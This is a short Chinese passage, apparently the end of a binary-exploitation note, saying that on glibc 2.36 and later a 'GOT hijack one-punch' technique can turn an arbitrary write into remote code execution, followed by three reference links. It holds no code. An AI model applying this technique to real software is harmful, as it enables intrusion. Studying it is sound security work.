2.36及以上可以选择glibc_got_hijack-one_punch来将任意地址写转换成rce。

## 参考

1. https://hackmd.io/@pepsipu/SyqPbk94a
2. https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/
3. https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md